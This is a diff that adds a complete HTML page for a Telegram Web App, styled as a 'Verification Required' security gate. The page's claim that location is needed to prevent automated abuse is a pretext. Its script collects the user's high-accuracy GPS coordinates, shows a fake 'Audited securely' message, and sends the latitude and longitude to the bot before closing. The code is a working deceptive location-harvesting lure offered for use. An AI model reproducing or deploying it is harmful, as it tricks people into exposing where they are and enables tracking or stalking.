@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f0f13;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background: #1c1c24;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 { margin-top: 0; color: #fff; }
+        p { color: #a0a0ab; line-height: 1.5; font-size: 15px; }
+        .btn {
+            background-color: #007aff;
+            color: #ffffff;
+            border: none;
+            padding: 14px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: opacity 0.2s;
+        }
+        .btn:active { opacity: 0.8; }
+        .btn:disabled { background-color: #33333b; color: #666; cursor: not-allowed; }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 20px;
+        }
+        .success { color: #34c759; }
+        .error { color: #ff3b30; }
+        .loading { color: #007aff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🛡 Verification Required</h2>
+        <p>To access the secure bot portal, we require strict location verification to prevent automated abuse.</p>
+        
+        <button id="verifyBtn" class="btn">Allow Check & Proceed</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        const btn = document.getElementById('verifyBtn');
+        const status = document.getElementById('status');
+
+        btn.addEventListener('click', () => {
+            btn.disabled = true;
+            status.className = 'loading';
+            status.innerText = "Requesting secure position...";
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        status.className = 'success';
+                        status.innerText = "✅ Audited securely. Returning...";
+                        
+                        setTimeout(() => {
+                            tg.sendData(JSON.stringify({ lat: lat, lon: lon, verified: true }));
+                            tg.close();
+                        }, 1200);
+                    },
+                    (error) => {
+                        btn.disabled = false;
+                        status.className = 'error';
+                        status.innerText = "❌ Security check failed or denied. Please permit location access.";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                status.className = 'error';
+                status.innerText = "❌ Device not compatible with our security audits.";
+            }
+        });
+    </script>
+</body>
+</html>
